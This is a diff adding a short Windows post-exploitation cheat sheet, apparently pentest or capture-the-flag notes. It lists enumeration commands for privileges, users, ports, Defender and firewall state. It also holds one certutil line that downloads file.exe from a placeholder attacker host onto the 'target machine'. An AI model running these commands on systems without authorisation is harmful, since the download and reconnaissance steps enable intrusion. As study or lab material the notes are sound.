@@ -1,0 +1,42 @@
+// System Information 
+systeminfo
+
+
+// Powershell command to Download a file to target machine
+certutil -urlcache -f http://<yourmachineIP>/file.exe file.exe
+
+
+// Check for privileges
+whoami /priv
+
+
+// Check for groups
+whoami /groups
+
+
+// Check for users
+net user
+
+
+// Check for information on a user
+net user <user>
+
+
+// Check for network ports - local
+netstat -ano
+
+
+// Find string for retriving files
+findstr /si <name> *<extension>
+
+
+// Check for service windows defender
+sc query windefend
+
+
+// Check for all service
+sc query type= service
+
+
+// Check for firewall status
+netsh firewall show state
